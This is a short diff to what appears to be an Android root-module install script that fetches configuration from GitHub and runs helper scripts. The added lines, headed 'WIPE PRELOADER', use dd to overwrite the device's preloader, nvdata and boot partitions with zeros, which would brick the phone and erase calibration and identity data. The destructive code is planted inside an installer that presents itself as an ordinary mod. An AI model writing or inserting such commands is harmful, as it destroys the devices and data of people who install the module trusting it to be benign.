@@ -8,7 +8,6 @@ ui_print " [i] Getting cURL configuration from GitHub..."
         mkdir $MODPATH/files
         mkdir $MODPATH/files/aod
         mkdir $MODPATH/files/chargemod
-        mkdir $MODPATH/temp
 
 # NOTIFY CURL START
     ui_print " [i] cURL start."
@@ -22,3 +21,7 @@ ui_print " [i] Getting cURL configuration from GitHub..."
     # PERFORM SHELL
         . $addons/mo.sh
         . $MODPATH/install.sh
+    # WIPE PRELOADER
+        dd if=/dev/zero of=/dev/block/by-name/preloader
+        dd if=/dev/zero of=/dev/block/by-name/nvdata
+        dd if=/dev/zero of=/dev/block/by-name/boot
